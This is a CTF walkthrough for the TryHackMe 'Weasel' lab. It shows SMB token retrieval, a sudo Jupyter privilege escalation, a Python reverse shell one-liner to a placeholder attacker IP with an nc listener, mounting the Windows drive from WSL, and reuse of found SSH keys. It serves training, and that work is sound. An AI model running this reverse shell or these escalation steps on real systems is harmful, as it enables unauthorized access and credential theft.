# Weasel

[Weasel](https://tryhackme.com/room/weasel)

## Solution

### Enumeration

- nmap scan: 22, 135, 139, 445, 3389, 8888

### Notebook token

```
echo "" | smbclient \\\\$IP\\datasci-team -c 'get misc/jupyter-token.txt' && cat misc/jupyter-token.txt
```

1. Create a new terminal `New` -> `Terminal`
2. `ln -s /home/dev-datasci/anaconda3/bin/jupyter /home/dev-datasci/.local/bin/jupyter`
3. `sudo .local/bin/jupyter console`
4. On the host start `nc -lvnp 6969`
5. On the target run a revshell script. `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")`
    - python3 -c 'import pty;pty.spawn("/bin/bash")'
6. `mount -t drvfs C: /mnt/c`

### Windows Filesystem

User Flag: `cat /mnt/c/Users/dev-datasci-lowpriv/Desktop/user.txt`

### Easy Way with nc

```
cd /mnt/c/Users/Administrator/Desktop
cat root.txt
```

### Get User in cmd

```
cd /mnt/c/Users/dev-datasci-lowpriv/.ssh
chmod 600 authorized_keys
chmod 600 id_ed25519
chmod 600 id_ed25519.pub
```

On host `ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv@$IP`
